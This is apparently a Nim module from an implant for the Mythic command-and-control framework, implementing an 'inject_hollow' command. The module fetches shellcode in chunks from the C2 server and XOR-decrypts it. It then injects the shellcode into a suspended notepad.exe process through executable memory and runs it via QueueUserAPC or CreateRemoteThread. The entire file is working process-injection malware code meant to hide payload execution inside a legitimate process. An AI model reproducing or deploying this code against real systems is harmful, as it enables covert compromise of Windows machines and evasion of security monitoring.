import ../config
import ../utils/mythic_responses
import std/[json, strutils, strformat, base64]

when defined(windows):
  import winim/lean

type
  InjectHollowArgs = object
    uuid: string
    shellcode_name: string
    technique: string
    key: string

proc xorDecrypt(data: seq[byte], key: string): seq[byte] =
  ## XOR decrypt shellcode with key
  if key.len == 0:
    return data
  
  result = newSeq[byte](data.len)
  for i in 0..<data.len:
    result[i] = data[i] xor byte(key[i mod key.len])

proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
  ## Inject shellcode using QueueUserAPC technique
  when defined(windows):
    try:
      # Validate shellcode
      if shellcode.len == 0:
        return (false, "Shellcode is empty (0 bytes)")
      
      # Start a suspended notepad process
      var si: STARTUPINFOA
      var pi: PROCESS_INFORMATION
      si.cb = sizeof(STARTUPINFOA).DWORD
      
      let success = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        nil,
        nil,
        nil,
        FALSE,
        CREATE_SUSPENDED or CREATE_NO_WINDOW,
        nil,
        nil,
        addr si,
        addr pi
      )
      
      if success == 0:
        return (false, "CreateProcessA failed: " & $GetLastError())
      
      # Allocate memory in target process
      let pRemote = VirtualAllocEx(
        pi.hProcess,
        nil,
        SIZE_T(shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      )
      
      if pRemote == nil:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, &"VirtualAllocEx failed: {err} (size: {shellcode.len} bytes)")
      
      # Write shellcode to target process
      var bytesWritten: SIZE_T
      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0], SIZE_T(shellcode.len), addr bytesWritten) == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "WriteProcessMemory failed: " & $err)
      
      # Queue APC to suspended thread
      if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "QueueUserAPC failed: " & $err)
      
      # Resume thread to execute APC
      discard ResumeThread(pi.hThread)
      
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (true, "")
      
    except Exception as e:
      return (false, "Exception: " & e.msg)
  else:
    return (false, "Not on Windows")

proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, error: string] =
  ## Inject shellcode using CreateRemoteThread technique
  when defined(windows):
    try:
      # Validate shellcode
      if shellcode.len == 0:
        return (false, "Shellcode is empty (0 bytes)")
      
      # Start a suspended notepad process
      var si: STARTUPINFOA
      var pi: PROCESS_INFORMATION
      si.cb = sizeof(STARTUPINFOA).DWORD
      
      let success = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        nil,
        nil,
        nil,
        FALSE,
        CREATE_SUSPENDED or CREATE_NO_WINDOW,
        nil,
        nil,
        addr si,
        addr pi
      )
      
      if success == 0:
        return (false, "CreateProcessA failed: " & $GetLastError())
      
      # Allocate memory in target process
      let pRemote = VirtualAllocEx(
        pi.hProcess,
        nil,
        SIZE_T(shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      )
      
      if pRemote == nil:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, &"VirtualAllocEx failed: {err} (size: {shellcode.len} bytes)")
      
      # Write shellcode to target process
      var bytesWritten: SIZE_T
      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0], SIZE_T(shellcode.len), addr bytesWritten) == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "WriteProcessMemory failed: " & $err)
      
      # Create remote thread
      var threadId: DWORD
      let hRemoteThread = CreateRemoteThread(
        pi.hProcess,
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](pRemote),
        nil,
        0,
        addr threadId
      )
      
      if hRemoteThread == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "CreateRemoteThread failed: " & $err)
      
      CloseHandle(hRemoteThread)
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (true, "")
      
    except Exception as e:
      return (false, "Exception: " & e.msg)
  else:
    return (false, "Not on Windows")

proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
  ## Inject shellcode into a remote process using process hollowing
  let cfg = getConfig()
  
  when defined(windows):
    try:
      let args = to(params, InjectHollowArgs)
      
      if cfg.debug:
        echo "[DEBUG] Inject hollow: ", args.shellcode_name
        echo "[DEBUG] Technique: ", args.technique
        echo "[DEBUG] UUID for download: ", args.uuid
      
      # Return initial response - request the file from Mythic
      return %*{
        "task_id": taskId,
        "upload": {
          "file_id": args.uuid,
          "chunk_num": 1,
          "chunk_size": 512000,
          "full_path": ""
        }
      }
      
    except Exception as e:
      return mythicError(taskId, "Inject hollow error: " & e.msg)
  else:
    return mythicError(taskId, "inject_hollow command is only available on Windows")

proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: string, 
                               totalChunks: int, currentChunk: int, 
                               fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the shellcode file being downloaded
  when defined(windows):
    try:
      let args = to(params, InjectHollowArgs)
      let cfg = getConfig()
      
      # Decode and append chunk data
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      if cfg.debug:
        echo &"[DEBUG] Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      # If more chunks remain, request the next one
      if currentChunk < totalChunks:
        return %*{
          "task_id": taskId,
          "upload": {
            "chunk_size": 512000,
            "file_id": args.uuid,
            "chunk_num": currentChunk + 1,
            "full_path": ""
          }
        }
      
      # All chunks received - execute the injection
      return executeInjectHollow(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, "Inject hollow chunk processing error: " & e.msg)
  else:
    return mythicError(taskId, "inject_hollow command is only available on Windows")

proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Execute the shellcode injection after download is complete
  let cfg = getConfig()
  
  when defined(windows):
    try:
      let args = to(params, InjectHollowArgs)
      
      # Validate shellcode was received
      if shellcode.len == 0:
        return mythicError(taskId, "Shellcode is empty - file download may have failed")
      
      # Decrypt shellcode if key is provided
      var finalShellcode = shellcode
      if args.key.len > 0:
        if cfg.debug:
          echo "[DEBUG] Decrypting shellcode with XOR key"
        finalShellcode = xorDecrypt(shellcode, args.key)
      
      if cfg.debug:
        echo "[DEBUG] Injecting shellcode (", finalShellcode.len, " bytes) via ", args.technique
      
      var result: tuple[success: bool, error: string]
      case args.technique.toLower():
      of "apc":
        result = injectViaAPC(finalShellcode)
      of "createremotethread":
        result = injectViaCreateRemoteThread(finalShellcode)
      else:
        return mythicError(taskId, &"Unknown injection technique: {args.technique}")
      
      if result.success:
        return mythicSuccess(taskId, &"Shellcode injected successfully via {args.technique}")
      else:
        return mythicError(taskId, &"Failed to inject shellcode via {args.technique}: {result.error}")
      
    except Exception as e:
      return mythicError(taskId, "Inject hollow execution error: " & e.msg)
  else:
    return mythicError(taskId, "inject_hollow command is only available on Windows")
